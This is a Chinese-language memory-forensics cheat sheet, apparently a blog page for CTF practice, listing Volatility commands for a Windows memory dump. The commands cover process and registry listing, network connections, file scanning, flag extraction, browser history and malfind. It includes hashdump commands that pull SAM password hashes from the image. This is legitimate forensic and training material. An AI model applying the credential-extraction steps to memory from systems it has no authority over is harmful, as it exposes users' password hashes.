<strong>查看隐藏进程</strong></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">volatility -f mem.raw --profile=Win7SP1x64 pstree</span><br><span class="line">volatility -f mem.raw --profile=Win7SP1x64 psxview</span><br></pre></td></tr></table></figure><p><strong><img data-src="https://gitee.com/chungod/picture/raw/master/image/image-20201102154603111.png" alt="image-20201102154603111"></strong></p><h3 id="列举缓存在内存的注册表"><a class="markdownIt-Anchor" href="#列举缓存在内存的注册表">#</a> <strong>列举缓存在内存的注册表</strong></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">volatility -f mem.raw --profile=Win7SP1x64 hivelist</span><br></pre></td></tr></table></figure><p><strong><img data-src="https://gitee.com/chungod/picture/raw/master/image/image-20201102150810232.png" alt="image-20201102150810232"></strong></p><h3 id="提取主机名"><a class="markdownIt-Anchor" href="#提取主机名">#</a> <strong>提取主机名</strong></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">volatility -f mem.raw --profile=Win7SP1x64 printkey -K &quot;ControlSet001\Control\ComputerName\ComputerName&quot;</span><br></pre></td></tr></table></figure><p><strong><img data-src="https://gitee.com/chungod/picture/raw/master/image/image-20201115091150119.png" alt="image-20201115091150119"></strong></p><h3 id="提取自启动项"><a class="markdownIt-Anchor" href="#提取自启动项">#</a> <strong>提取自启动项</strong></h3><p><strong><img data-src="https://gitee.com/chungod/picture/raw/master/image/image-20201115091434803.png" alt="image-20201115091434803"></strong></p><p><strong>提取内存中保留的 cmd 命令使用情况</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">volatility -f name --profile=WinXPSP2x86 cmdscan</span><br></pre></td></tr></table></figure><p><strong>获取到当时的网络连接情况</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">volatility -f name --profile=WinXPSP2x86 netscan</span><br></pre></td></tr></table></figure><h3 id="提取ip地址和主机名"><a class="markdownIt-Anchor" href="#提取ip地址和主机名">#</a> <strong>提取 ip 地址和主机名</strong></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">volatility -f name --profile=WinXPSP2x86 netscan | grep ESTABLISHED</span><br></pre></td></tr></table></figure><p><strong>userassist 键值包含系统或桌面执行文件的信息，如名称、路径、执行次数、最后一次执行时间等</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">volatility -f name --profile=WinXPSP2x86 userassist</span><br></pre></td></tr></table></figure><h3 id="获取sam表中的用户"><a class="markdownIt-Anchor" href="#获取sam表中的用户">#</a> <strong>获取 SAM 表中的用户 ：</strong></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">volatility -f mem.raw --profile=Win7SP1x64 printkey -K &quot;SAM\Domains\Account\Users\Names&quot;</span><br></pre></td></tr></table></figure><p><strong><img data-src="https://gitee.com/chungod/picture/raw/master/image/image-20201102152225937.png" alt="image-20201102152225937"></strong></p><p><strong>显示每个进程的加载 dll 列表</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Volatility -f name -profile = Win7SP0x86 dlllist&gt; dlllist.txt</span><br></pre></td></tr></table></figure><h3 id="扫描内存中的文件"><a class="markdownIt-Anchor" href="#扫描内存中的文件">#</a> <strong>扫描内存中的文件</strong></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">volatility -f mem.raw --profile=Win7SP1x64 filescan</span><br></pre></td></tr></table></figure><p><strong><img data-src="https://gitee.com/chungod/picture/raw/master/image/image-20201102151129039.png" alt="image-20201102151129039"></strong></p><ul><li><strong>filescan 也可以结合 grep 命令来进行筛选，比如</strong></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">volatility -f mem.raw --profile=Win7SP1x64 filescan | grep &quot;doc\|docx&quot;</span><br><span class="line">volatility -f mem.raw --profile=Win7SP1x64 filescan | grep &quot;flag&quot;</span><br></pre></td></tr></table></figure><p><strong><img data-src="https://gitee.com/chungod/picture/raw/master/image/image-20201102151359619.png" alt="image-20201102151359619"></strong></p><p><img data-src="https://gitee.com/chungod/picture/raw/master/image/image-20201203173328344.png" alt="image-20201203173328344"></p><h2 id="提取flag值"><a class="markdownIt-Anchor" href="#提取flag值">#</a> 提取 flag 值</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">volatility -f mem.raw --profile=Win7SP1x64 dumpfiles -Q 0x07f1b6c10 --dump-dir=./</span><br></pre></td></tr></table></figure><p><img data-src="https://gitee.com/chungod/picture/raw/master/image/image-20201203174024646.png" alt="image-20201203174024646"></p><p><img data-src="https://gitee.com/chungod/picture/raw/master/image/image-20201203174048410.png" alt="image-20201203174048410"></p><h3 id="提取内存中保留的cmd命令使用情况"><a class="markdownIt-Anchor" href="#提取内存中保留的cmd命令使用情况">#</a> <strong>提取内存中保留的 cmd 命令使用情况</strong></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">volatility -f mem.raw --profile=Win7SP1x64 cmdline</span><br></pre></td></tr></table></figure><p><strong><img data-src="https://gitee.com/chungod/picture/raw/master/image/image-20201102151626278.png" alt="image-20201102151626278"></strong></p><h3 id="提取出内存中记录的-当时正在运行的程序"><a class="markdownIt-Anchor" href="#提取出内存中记录的-当时正在运行的程序">#</a> <strong>提取出内存中记录的 当时正在运行的程序</strong></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">volatility -f mem.vmem --profile=Win7SP1x64 userassist</span><br></pre></td></tr></table></figure><p><strong><img data-src="https://gitee.com/chungod/picture/raw/master/image/image-20201102152650474.png" alt="image-20201102152650474"></strong></p><h2 id="提取网络连接情况"><a class="markdownIt-Anchor" href="#提取网络连接情况">#</a> <strong>提取网络连接情况</strong></h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">volatility -f mem.raw --profile=Win7SP1x64 netscan</span><br></pre></td></tr></table></figure><p><strong><img data-src="https://gitee.com/chungod/picture/raw/master/image/image-20201102153001736.png" alt="image-20201102153001736"></strong></p><h3 id="提取ie浏览器历史"><a class="markdownIt-Anchor" href="#提取ie浏览器历史">#</a> <strong>提取 IE 浏览器历史</strong></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">volatility -f mem.raw --profile=Win7SP1x64 iehistory</span><br></pre></td></tr></table></figure><h3 id="提取系统密码hashdump"><a class="markdownIt-Anchor" href="#提取系统密码hashdump">#</a> <strong>提取系统密码</strong>（hashdump）</h3><p><strong>直接 hashdump</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">volatility -f mem.raw --profile=Win7SP1x64 hashdump</span><br></pre></td></tr></table></figure><p><strong><img data-src="https://gitee.com/chungod/picture/raw/master/image/image-20201102154219862.png" alt="image-20201102154219862"></strong></p><ul><li><strong>注册表 system 的 virtual 地址</strong></li><li><strong>SAM 的 virtual 地址</strong></li></ul><p><strong><img data-src="https://gitee.com/chungod/picture/raw/master/image/image-20201102153454213.png" alt="image-20201102153454213"></strong></p><ul><li><strong>dump 出来密码</strong></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">volatility -f mem.vmem --profile=Win7SP1x64 hashdump -y （注册表 system 的 virtual 地址 ）-s （SAM 的 virtual 地址）</span><br><span class="line">volatility -f mem.vmen --profile=Win7SP1x64 hashdump -y 0xfffff8a000024010 -s 0xfffff8a000867010</span><br></pre></td></tr></table></figure><p><strong><img data-src="https://gitee.com/chungod/picture/raw/master/image/image-20201102153714379.png" alt="image-20201102153714379"></strong></p><h3 id="提取迁移后的进程编号"><a class="markdownIt-Anchor" href="#提取迁移后的进程编号">#</a> 提取迁移后的进程编号</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">volatility -f mem.raw --profile=Win7SP1x64 malfind -p</span><br></pre></td></tr></table></figure><h3 id="提取开机自启项的virtual地址"><a class="markdownIt-Anchor" href="#提取开机自启项的virtual地址">#</a> 提取开机自启项的 Virtual 地址</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">volatility -f mem.raw --profile=Win7SP1x64 printkey -K &quot;SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce&quot;</span><br><span class="line">volatility -f mem.raw --profile=Win7SP1x64 printkey -K &quot;SOFTWARE\Microsoft\Windows\CurrentVersion\Run&quot;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> 内存取证 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
